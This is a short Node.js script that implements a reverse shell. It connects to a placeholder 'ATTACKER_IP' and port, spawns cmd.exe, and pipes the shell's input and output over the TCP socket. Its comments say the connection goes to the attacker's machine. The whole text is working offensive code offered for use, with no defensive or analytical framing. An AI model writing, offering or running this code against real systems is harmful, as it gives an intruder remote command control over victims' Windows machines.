// Import necessary modules
const net = require('net');
const { spawn } = require('child_process');

// Define the reverse shell function
function reverseShell(host, port) {
    // Create a TCP connection to the attacker's machine
    const client = new net.Socket();
    client.connect(port, host, () => {
        // Spawn a shell upon connection
        const shell = spawn('cmd.exe', []);
        // Pipe the shell output to the TCP connection
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
        // Pipe the TCP connection input into the shell
        client.pipe(shell.stdin);
    });
}

// Call the reverse shell function with your machine's IP and a chosen port
reverseShell('ATTACKER_IP', ATTACKER_PORT);
